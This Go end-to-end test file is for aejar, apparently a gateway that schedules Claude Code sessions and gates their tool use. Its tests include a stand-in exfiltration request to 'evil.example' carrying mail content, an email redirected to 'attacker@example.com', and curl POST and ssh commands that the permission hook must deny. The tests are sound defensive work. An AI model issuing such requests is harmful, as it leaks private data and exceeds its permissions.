// Package e2e drives aejard over its real HTTP (grpc-gateway) and gRPC
// surfaces, with a fake clock, fake machine resources and a recording runner.
package e2e

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"database/sql"

	"github.com/eyanshu1997/aejar/internal/auth"
	"github.com/eyanshu1997/aejar/internal/canon"
	"github.com/eyanshu1997/aejar/internal/runner"
	"github.com/eyanshu1997/aejar/internal/scheduler"
	"github.com/eyanshu1997/aejar/internal/server"
	"github.com/eyanshu1997/aejar/internal/store"
)

type clock struct {
	mu  sync.Mutex
	now time.Time
}

func (c *clock) Now() time.Time          { c.mu.Lock(); defer c.mu.Unlock(); return c.now }
func (c *clock) Advance(d time.Duration) { c.mu.Lock(); c.now = c.now.Add(d); c.mu.Unlock() }

type env struct {
	t     *testing.T
	url   string
	owner string
	srv   *server.Server
	rec   *runner.Recorder
	db    *sql.DB
	clock *clock
	res   scheduler.Resources
}

func setup(t *testing.T) *env {
	return setupWith(t, nil)
}

// setupWith lets a test adjust the authenticator (e.g. enable Google login).
func setupWith(t *testing.T, configure func(*auth.Authenticator)) *env {
	t.Helper()
	ctx := context.Background()
	db, err := store.Open(ctx, filepath.Join(t.TempDir(), "aejar.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	owner := auth.NewToken()
	ist, _ := time.LoadLocation("Asia/Kolkata")
	e := &env{t: t, owner: owner, rec: &runner.Recorder{}, db: db,
		clock: &clock{now: time.Date(2026, 10, 22, 14, 0, 0, 0, ist)},
		res:   scheduler.Resources{MemAvailableMB: 2000, Load1: 0.5}}
	authn := &auth.Authenticator{DB: db, OwnerTokenHash: canon.HashBytes([]byte(owner))}
	if configure != nil {
		configure(authn)
	}
	e.srv = server.New(db, authn, e.rec)
	e.srv.Now = e.clock.Now
	e.srv.Resources = func() scheduler.Resources { return e.res }
	h, cleanup, err := e.srv.Handler(ctx)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(cleanup)
	hs := httptest.NewServer(h)
	t.Cleanup(hs.Close)
	e.url = hs.URL
	return e
}

// call makes a JSON request and returns the status code and decoded body.
func (e *env) call(method, path, token string, body any) (int, map[string]any) {
	e.t.Helper()
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = bytes.NewReader(b)
	}
	req, _ := http.NewRequest(method, e.url+path, rd)
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	out := map[string]any{}
	raw, _ := io.ReadAll(resp.Body)
	if len(raw) > 0 {
		if err := json.Unmarshal(raw, &out); err != nil {
			e.t.Fatalf("%s %s: non-JSON response %q", method, path, raw)
		}
	}
	return resp.StatusCode, out
}

func (e *env) must(method, path, token string, body any) map[string]any {
	e.t.Helper()
	code, out := e.call(method, path, token, body)
	if code != http.StatusOK {
		e.t.Fatalf("%s %s: %d %v", method, path, code, out)
	}
	return out
}

func (e *env) tick() {
	e.t.Helper()
	if err := e.srv.Tick(context.Background()); err != nil {
		e.t.Fatal(err)
	}
}

// startTask creates a task, runs the scheduler and returns the task id and
// the session token the runner was given.
func (e *env) startTask(title, profile string) (string, string) {
	e.t.Helper()
	task := e.must("POST", "/v1/tasks", e.owner, map[string]any{"title": title, "profile": profile})
	id := task["id"].(string)
	e.tick()
	for _, c := range e.rec.Calls() {
		if c.Op == "start" && c.TaskID == id {
			return id, c.Spec.SessionToken
		}
	}
	e.t.Fatalf("task %s was not started", id)
	return "", ""
}

func (e *env) state(id string) string {
	e.t.Helper()
	return e.must("GET", "/v1/tasks/"+id, e.owner, nil)["state"].(string)
}

// preTool posts a PreToolUse hook exactly as Claude Code does, including
// fields aejar does not model, and returns the permission decision ("" when
// the hook let the normal flow continue).
func (e *env) preTool(token, tool string, input map[string]any) (string, string) {
	e.t.Helper()
	out := e.must("POST", "/hooks/claude/pre-tool", token, map[string]any{
		"session_id": "sess-1", "hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": input,
		"cwd": "/work", "permission_mode": "bypassPermissions", "effort": map[string]any{"level": "high"},
		"prompt_id": "p-1",
	})
	hso, _ := out["hookSpecificOutput"].(map[string]any)
	if hso == nil {
		return "", ""
	}
	return hso["permissionDecision"].(string), hso["permissionDecisionReason"].(string)
}

func TestAuthBoundaries(t *testing.T) {
	e := setup(t)
	if code, _ := e.call("GET", "/v1/tasks", "", nil); code != http.StatusUnauthorized {
		t.Fatalf("anonymous list: %d", code)
	}
	if code, _ := e.call("GET", "/v1/tasks", "wrong-token", nil); code != http.StatusUnauthorized {
		t.Fatalf("bad token: %d", code)
	}
	_, sess := e.startTask("t", "plan")
	if code, _ := e.call("GET", "/v1/tasks", sess, nil); code != http.StatusForbidden {
		t.Fatalf("session listing tasks: %d", code)
	}
	if code, _ := e.call("POST", "/v1/status:cap", sess, map[string]any{"cap": 5}); code != http.StatusForbidden {
		t.Fatalf("session changing cap: %d", code)
	}
	if code, _ := e.call("POST", "/hooks/claude/stop", e.owner, map[string]any{}); code != http.StatusForbidden {
		t.Fatalf("owner posting a hook: %d", code)
	}
}

// TestApprovalGateForExternalAction walks the whole R3 path: a mail session
// tries to send, is denied, asks for approval, the owner approves the exact
// payload, the identical call goes through once, and nothing else does.
func TestApprovalGateForExternalAction(t *testing.T) {
	e := setup(t)
	taskID, sess := e.startTask("reply to landlord", "mail")
	send := "mcp__claude_ai_Gmail__send_message"
	msg := map[string]any{"to": "landlord@example.com", "subject": "Rent", "body": "Paid today.", "cc": []any{}}

	// Reading mail is fine, and makes the session sensitive.
	if d, _ := e.preTool(sess, "mcp__claude_ai_Gmail__search_threads", map[string]any{"query": "rent"}); d != "" {
		t.Fatalf("gmail search: %q", d)
	}
	// Sensitive sessions lose the web.
	if d, _ := e.preTool(sess, "WebFetch", map[string]any{"url": "https://evil.example/?q=rent"}); d != "deny" {
		t.Fatalf("webfetch after reading mail: %q", d)
	}

	// Sending is denied and points at the approval tool.
	d, reason := e.preTool(sess, send, msg)
	if d != "deny" || !strings.Contains(reason, "request_approval") {
		t.Fatalf("send before approval: %q %q", d, reason)
	}

	// The session asks; it cannot decide its own request.
	a := e.must("POST", "/v1/approvals", sess, map[string]any{
		"class": "APPROVAL_CLASS_ACTION", "summary": "Reply to landlord", "tool_name": send, "payload": msg,
		"task_id": "someone-elses-task",
	})
	aid := a["id"].(string)
	if a["taskId"] != taskID {
		t.Fatalf("session approval bound to %v, want its own task %s", a["taskId"], taskID)
	}
	if code, _ := e.call("POST", "/v1/approvals/"+aid+":decide", sess, map[string]any{"approve": true, "payload_hash": a["payloadHash"]}); code != http.StatusForbidden {
		t.Fatalf("session approving its own request: %d", code)
	}

	// Idle while waiting: the task gives its slot back.
	e.must("POST", "/hooks/claude/stop", sess, map[string]any{"session_id": "sess-1", "hook_event_name": "Stop"})
	if st := e.state(taskID); st != "TASK_STATE_WAITING" {
		t.Fatalf("state after idle with pending approval: %s", st)
	}
	// Its token died with the session.
	if code, _ := e.call("POST", "/hooks/claude/pre-tool", sess, map[string]any{"tool_name": "Read"}); code != http.StatusUnauthorized {
		t.Fatalf("revoked token still works: %d", code)
	}

	// The owner must approve what they saw: a stale hash is refused.
	if code, _ := e.call("POST", "/v1/approvals/"+aid+":decide", e.owner, map[string]any{"approve": true, "payload_hash": "stale"}); code != http.StatusBadRequest {
		t.Fatalf("approve with wrong hash: %d", code)
	}
	e.must("POST", "/v1/approvals/"+aid+":decide", e.owner, map[string]any{"approve": true, "payload_hash": a["payloadHash"]})
	if st := e.state(taskID); st != "TASK_STATE_QUEUED" {
		t.Fatalf("state after approval: %s", st)
	}

	// The task resumes with a fresh session token and the same conversation.
	e.tick()
	var resumed string
	for _, c := range e.rec.Calls() {
		if c.Op == "start" && c.TaskID == taskID {
			resumed = c.Spec.SessionToken
		}
	}
	if resumed == "" || resumed == sess {
		t.Fatal("task was not restarted with a new token")
	}

	// A different message is still blocked.
	altered := map[string]any{"to": "attacker@example.com", "subject": "Rent", "body": "Paid today.", "cc": []any{}}
	if d, _ := e.preTool(resumed, send, altered); d != "deny" {
		t.Fatalf("altered payload: %q", d)
	}
	// The approved message goes through, with keys in any order.
	reordered := map[string]any{"cc": []any{}, "body": "Paid today.", "subject": "Rent", "to": "landlord@example.com"}
	if d, _ := e.preTool(resumed, send, reordered); d != "allow" {
		t.Fatalf("approved payload: %q", d)
	}
	// Exactly once.
	if d, _ := e.preTool(resumed, send, msg); d != "deny" {
		t.Fatalf("second use of a single-use approval: %q", d)
	}
}

func TestApprovalExpires(t *testing.T) {
	e := setup(t)
	_, sess := e.startTask("t", "mail")
	a := e.must("POST", "/v1/approvals", sess, map[string]any{
		"class": "APPROVAL_CLASS_ACTION", "summary": "send", "tool_name": "mcp__claude_ai_Gmail__send_message",
		"payload": map[string]any{"to": "x@example.com"},
	})
	e.clock.Advance(25 * time.Hour)
	code, _ := e.call("POST", "/v1/approvals/"+a["id"].(string)+":decide", e.owner, map[string]any{"approve": true, "payload_hash": a["payloadHash"]})
	if code != http.StatusBadRequest {
		t.Fatalf("approving an expired request: %d", code)
	}
	if st := e.must("GET", "/v1/approvals/"+a["id"].(string), e.owner, nil)["state"]; st != "APPROVAL_STATE_EXPIRED" {
		t.Fatalf("state: %v", st)
	}
}

func TestProfilesAndReadOnlyInternet(t *testing.T) {
	e := setup(t)
	_, sess := e.startTask("research laptops", "research")
	cases := []struct {
		tool  string
		input map[string]any
		want  string
	}{
		{"WebFetch", map[string]any{"url": "https://www.amazon.in/s?k=laptop"}, ""},
		{"Bash", map[string]any{"command": "curl -s https://www.amazon.in/dp/B0TEST"}, ""},
		{"Bash", map[string]any{"command": "curl -X POST https://forms.example/submit -d name=me"}, "deny"},
		{"Bash", map[string]any{"command": "curl -X POST http://coherence:8080/comment-api/update-doc -d '{}'"}, ""},
		{"Bash", map[string]any{"command": "ssh build-server"}, "deny"},
		{"mcp__claude_ai_Gmail__search_threads", map[string]any{}, "deny"},
		{"mcp__claude_ai_Google_Drive__search_files", map[string]any{}, "deny"},
		{"BrandNewTool", map[string]any{}, "deny"},
	}
	for _, tc := range cases {
		if d, reason := e.preTool(sess, tc.tool, tc.input); d != tc.want {
			t.Errorf("%s %v: got %q (%s), want %q", tc.tool, tc.input, d, reason, tc.want)
		}
	}
}

func TestUsageLimitBlocksNewWorkUntilReset(t *testing.T) {
	e := setup(t)
	_, sess := e.startTask("first", "plan")
	e.must("POST", "/hooks/claude/stop-failure", sess, map[string]any{
		"hook_event_name": "StopFailure", "error": "rate_limit", "error_details": "429",
		"last_assistant_message": "You've hit your limit. Your limit resets 6pm (Asia/Kolkata)",
	})
	st := e.must("GET", "/v1/status", e.owner, nil)
	until, _ := time.Parse(time.RFC3339, st["limitBlockedUntil"].(string))
	if until.In(e.srv.Sched.Location).Hour() != 18 {
		t.Fatalf("limit until %v", until)
	}
	second := e.must("POST", "/v1/tasks", e.owner, map[string]any{"title": "second"})["id"].(string)
	e.tick()
	if s := e.state(second); s != "TASK_STATE_QUEUED" {
		t.Fatalf("task started during a usage limit: %s", s)
	}
	e.clock.Advance(4*time.Hour + time.Minute)
	e.tick()
	if s := e.state(second); s != "TASK_STATE_RUNNING" {
		t.Fatalf("task not started after reset: %s", s)
	}
}

func TestCapChangeNeedsApproval(t *testing.T) {
	e := setup(t)
	for i := 0; i < 4; i++ {
		e.must("POST", "/v1/tasks", e.owner, map[string]any{"title": "t", "class": "TASK_CLASS_P2"})
	}
	e.tick()
	if st := e.must("GET", "/v1/status", e.owner, nil); st["running"] != float64(2) {
		t.Fatalf("running with default cap: %v", st["running"])
	}
	a := e.must("POST", "/v1/status:cap", e.owner, map[string]any{"cap": 3})
	e.tick()
	if st := e.must("GET", "/v1/status", e.owner, nil); st["running"] != float64(2) {
		t.Fatalf("cap applied before approval: %v", st)
	}
	e.must("POST", "/v1/approvals/"+a["id"].(string)+":decide", e.owner, map[string]any{"approve": true, "payload_hash": a["payloadHash"]})
	e.tick()
	if st := e.must("GET", "/v1/status", e.owner, nil); st["cap"] != float64(3) || st["running"] != float64(3) {
		t.Fatalf("after approval: %v", st)
	}
}

func TestResourceGuards(t *testing.T) {
	e := setup(t)
	e.res = scheduler.Resources{MemAvailableMB: 400, Load1: 0.5}
	id := e.must("POST", "/v1/tasks", e.owner, map[string]any{"title": "t"})["id"].(string)
	e.tick()
	if s := e.state(id); s != "TASK_STATE_QUEUED" {
		t.Fatalf("started on low memory: %s", s)
	}
	e.res = scheduler.Resources{MemAvailableMB: 2000, Load1: 3.9}
	e.tick()
	if s := e.state(id); s != "TASK_STATE_QUEUED" {
		t.Fatalf("started on high load: %s", s)
	}
	e.res.Load1 = 1
	e.tick()
	if s := e.state(id); s != "TASK_STATE_RUNNING" {
		t.Fatalf("not started once healthy: %s", s)
	}
}

func TestAuditChainCoversActionsAndDetectsTampering(t *testing.T) {
	e := setup(t)
	_, sess := e.startTask("t", "mail")
	e.preTool(sess, "mcp__claude_ai_Gmail__send_message", map[string]any{"to": "x@example.com"})
	v := e.must("GET", "/v1/audit:verify", e.owner, nil)
	if v["ok"] != true {
		t.Fatalf("fresh chain: %v", v)
	}
	events := e.must("GET", "/v1/audit?limit=100", e.owner, nil)["events"].([]any)
	var sawDenial bool
	for _, ev := range events {
		if ev.(map[string]any)["action"] == "tool.needs_approval" {
			sawDenial = true
		}
	}
	if !sawDenial {
		t.Fatal("blocked send was not audited")
	}
	// Rewrite history: verification must notice.
	if _, err := e.db.Exec(`UPDATE audit_events SET actor = 'owner:token' WHERE action = 'tool.needs_approval'`); err != nil {
		t.Fatal(err)
	}
	v = e.must("GET", "/v1/audit:verify", e.owner, nil)
	if v["ok"] == true {
		t.Fatal("tampered chain verified ok")
	}
}

func TestHealthAndMetrics(t *testing.T) {
	e := setup(t)
	e.startTask("t", "plan")
	resp, err := http.Get(e.url + "/metrics")
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if !strings.Contains(string(b), `aejar_tasks{state="TASK_STATE_RUNNING"} 1`) {
		t.Fatalf("metrics:\n%s", b)
	}
	resp, err = http.Get(e.url + "/healthz")
	if err != nil || resp.StatusCode != http.StatusOK {
		t.Fatalf("healthz: %v %v", resp, err)
	}
}
